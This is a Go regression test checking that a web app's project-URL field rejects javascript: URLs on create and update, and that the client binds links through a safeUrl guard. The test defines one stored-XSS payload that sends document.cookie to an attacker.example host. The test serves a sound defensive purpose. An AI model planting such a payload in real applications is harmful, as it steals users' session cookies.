package main

import (
	"database/sql"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/DonaldMurillo/gofastr/framework"
	_ "github.com/DonaldMurillo/gofastr/sqlite/stdlib"
)

func openSpaTestDB(t *testing.T) *sql.DB {
	t.Helper()
	db, err := sql.Open("sqlite3", filepath.Join(t.TempDir(), "spa.db"))
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = db.Close() })
	return db
}

// TestProjectURLSchemeGuarded pins the stored-XSS chain end to end against
// main.go's real declarations (buildApp): a javascript: URL must not land
// in a stored project row (the Pattern allow-list refuses the write), and
// the client must never bind a stored URL into href without the safeUrl
// scheme guard. Cutting either link is not enough; both halves are pinned.
func TestProjectURLSchemeGuarded(t *testing.T) {
	db := openSpaTestDB(t)
	app := buildApp(db)
	if err := framework.AutoMigrate(db, app.Registry); err != nil {
		t.Fatalf("automigrate: %v", err)
	}
	do := func(method, path, body string) (int, string) {
		t.Helper()
		req := httptest.NewRequest(method, path, strings.NewReader(body))
		if body != "" {
			req.Header.Set("Content-Type", "application/json")
		}
		rec := httptest.NewRecorder()
		app.Router().ServeHTTP(rec, req)
		return rec.Code, rec.Body.String()
	}

	// Write half: anonymous create of a javascript:-scheme project URL
	// must be refused by the field Pattern, on create and on update.
	const payload = "javascript:fetch('//attacker.example/'+document.cookie)"
	code, body := do(http.MethodPost, "/api/projects", `{"name":"k","url":"`+payload+`"}`)
	if code < 400 {
		// Confirm persistence, not just a 2xx echo.
		listCode, listBody := do(http.MethodGet, "/api/projects", "")
		if listCode == http.StatusOK && strings.Contains(listBody, "javascript:") {
			t.Errorf("stored javascript: XSS chain intact at the write: anonymous POST /api/projects = %d persisted the row (list = %d %.120s) — the url field's Pattern allow-list must refuse non-http(s), non-relative schemes on create", code, listCode, body)
		}
	}
	code, _ = do(http.MethodPost, "/api/projects", `{"name":"ok","url":"https://go.dev"}`)
	if code >= 400 {
		t.Fatalf("legitimate https project URL rejected: %d — the Pattern must admit http(s) URLs", code)
	}
	listCode, listBody := do(http.MethodGet, "/api/projects", "")
	if listCode != http.StatusOK {
		t.Fatalf("GET /api/projects = %d", listCode)
	}
	goodID := ""
	if i := strings.Index(listBody, `"id":"`); i >= 0 {
		rest := listBody[i+6:]
		if j := strings.Index(rest, `"`); j >= 0 {
			goodID = rest[:j]
		}
	}
	if goodID != "" {
		if code, _ = do(http.MethodPatch, "/api/projects/"+goodID, `{"url":"`+payload+`"}`); code < 400 {
			t.Errorf("anonymous PATCH /api/projects/%s with a javascript: url = %d — the Pattern must also bind on partial update, or a sparse PATCH is the bypass route", goodID, code)
		}
	}

	// Execution half: the client binding, source contract. The raw
	// :href="p.url" binding must be gone; every project link binds through
	// safeUrl, which renders non-http(s), non-relative schemes inert.
	appjs, err := os.ReadFile(filepath.Join(resolveStaticDir(), "app.js"))
	if err != nil {
		t.Fatalf("read static/app.js: %v", err)
	}
	src := string(appjs)
	if strings.Contains(src, `:href="p.url"`) || !strings.Contains(src, `safeUrl(p.url)`) {
		t.Errorf("app.js binds a stored project url into <a :href> without the scheme guard: the template must bind :href=\"safeUrl(p.url)\" so a javascript: value that ever lands in a row cannot execute on click (Vue does not sanitize URL schemes in :href bindings)")
	}
}
